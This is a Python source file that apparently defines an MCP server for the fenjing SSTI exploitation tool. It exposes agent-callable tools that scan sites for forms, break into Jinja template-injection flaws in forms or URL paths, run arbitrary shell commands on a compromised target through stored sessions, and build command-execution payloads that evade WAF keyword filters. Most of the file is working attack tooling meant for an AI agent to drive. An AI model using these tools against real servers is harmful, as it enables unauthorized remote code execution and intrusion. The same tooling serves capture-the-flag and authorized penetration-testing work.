#!/usr/bin/env python3
"""fenjing MCP服务器模块"""


import json
import uuid
from typing import Dict
from mcp.server.fastmcp import FastMCP

from .requester import HTTPRequester
from .options import Options
from .form import get_form
from .scan_url import yield_form
from urllib.parse import urlparse
from .job import Job, FormCrackContext, PathCrackContext
from .full_payload_gen import FullPayloadGen

mcp = FastMCP("fenjing")
sessions: Dict[str, Job] = {}


@mcp.tool()
async def crack(url: str, method: str, inputs: str, interval: float) -> str:
    """
    执行SSTI攻击

    Args:
        url: 目标URL
        method: HTTP方法，GET或POST
        inputs: 输入参数，以逗号分隔
        interval: 请求间隔时间（秒）建议传入0.1以下的值

    Returns:
        session_id: 攻击成功后的会话ID
    """
    form = get_form(
        action=urlparse(url).path,
        method=method,
        inputs=inputs.split(",") if inputs else [],
    )

    requester = HTTPRequester(
        interval=interval,
        user_agent="fenjing-mcp/1.0",
        headers={},
        extra_params_querystr=None,
        extra_data_querystr=None,
        no_verify_ssl=False,
    )

    options = Options()

    context = FormCrackContext(
        url=url,
        form=form,
        requester=requester,
        options=options,
        tamper_cmd=None,
        method=method,
        inputs=inputs.split(",") if inputs else [],
    )

    job = Job(context)
    if job.do_crack_pre():
        session_id = str(uuid.uuid4())
        sessions[session_id] = job
        return json.dumps(
            {
                "session_id": session_id,
                "message": "攻击成功，已创建会话",
                "target": url,
                "method": method,
                "inputs": inputs,
            },
            ensure_ascii=False,
        )
    else:
        return json.dumps({"error": "攻击失败，未找到可用的输入字段"}, ensure_ascii=False)


@mcp.tool()
async def crack_path(url: str, interval: float) -> str:
    """
    执行路径型SSTI攻击

    Args:
        url: 目标URL, 例如`http://.../path/{{7*7}}`存在漏洞则传入`http://.../path/`
        interval: 请求间隔时间（秒）建议传入0.1以下的值

    Returns:
        session_id: 攻击成功后的会话ID
    """
    requester = HTTPRequester(
        interval=interval,
        user_agent="fenjing-mcp/1.0",
        headers={},
        extra_params_querystr=None,
        extra_data_querystr=None,
        no_verify_ssl=False,
    )

    options = Options()

    # 创建上下文
    context = PathCrackContext(
        url=url,
        requester=requester,
        options=options,
        tamper_cmd=None,
    )

    job = Job(context)
    if job.do_crack_pre():
        session_id = str(uuid.uuid4())
        sessions[session_id] = job
        return json.dumps(
            {
                "session_id": session_id,
                "message": "路径攻击成功，已创建会话",
                "target": url,
            },
            ensure_ascii=False,
        )
    else:
        return json.dumps({"error": "路径攻击失败"}, ensure_ascii=False)


@mcp.tool()
async def session_execute_command(session_id: str, command: str) -> str:
    """
    在攻击会话中执行命令

    Args:
        session_id: 会话ID
        command: 要执行的shell命令

    Returns:
        命令执行结果
    """
    job = sessions.get(session_id)
    if not job:
        return json.dumps({"error": "会话不存在或已过期"}, ensure_ascii=False)

    result = job.execute_command(command)
    return json.dumps({"success": True, "result": result, "session_id": session_id}, ensure_ascii=False)


@mcp.tool()
async def session_generate_payload(session_id: str, command: str) -> str:
    """
    为shell命令生成payload

    Args:
        session_id: 会话ID
        command: 要执行的shell命令

    Returns:
        生成的payload
    """
    job = sessions.get(session_id)
    if not job:
        return json.dumps({"error": "会话不存在或已过期"}, ensure_ascii=False)

    if job.payload_generator is None:
        return json.dumps({"error": "Job未初始化，无法生成payload"}, ensure_ascii=False)

    payload, will_print = job.payload_generator.generate("os_popen_read", command)

    if payload is None:
        return json.dumps({"error": "生成payload失败"}, ensure_ascii=False)

    return json.dumps(
        {"payload": payload, "will_print": will_print, "session_id": session_id},
        ensure_ascii=False,
    )


@mcp.tool()
async def scan(url: str, interval: float) -> str:
    """
    扫描目标URL并返回所有发现的表单

    Args:
        url: 目标URL
        interval: 请求间隔时间（秒）建议传入0.1以下的值

    Returns:
        扫描结果，包含所有发现的URL和表单
    """
    requester = HTTPRequester(
        interval=interval,
        user_agent="fenjing-mcp/1.0",
        headers={},
        extra_params_querystr=None,
        extra_data_querystr=None,
        no_verify_ssl=False,
    )

    results = []
    for target_url, forms in yield_form(requester, url):
        form_list = []
        for form in forms:
            form_list.append(
                {
                    "action": form["action"],
                    "method": form["method"],
                    "inputs": list(form["inputs"]),
                }
            )
        results.append({"url": target_url, "forms": form_list})

    return json.dumps(
        {"success": True, "results": results, "target": url}, ensure_ascii=False
    )


@mcp.tool()
async def crack_keywords(keywords: list[str], command: str) -> str:
    """
    根据关键字列表生成绕过WAF的payload

    Args:
        keywords: 被WAF禁止的关键字列表
        command: 要执行的shell命令

    Returns:
        生成的payload信息
    """
    options = Options()
    options.waf_keywords = keywords

    waf_func = lambda x: all(keyword not in x for keyword in keywords)

    full_payload_gen = FullPayloadGen(
        waf_func=waf_func,
        callback=None,
        options=options,
    )

    payload, will_print = full_payload_gen.generate("os_popen_read", command)

    if payload is None:
        return json.dumps({"error": "生成payload失败"}, ensure_ascii=False)

    return json.dumps(
        {
            "success": True,
            "payload": payload,
            "will_print": will_print,
            "command": command,
        },
        ensure_ascii=False,
    )


def main():
    """启动MCP服务器"""
    mcp.run(transport="stdio")
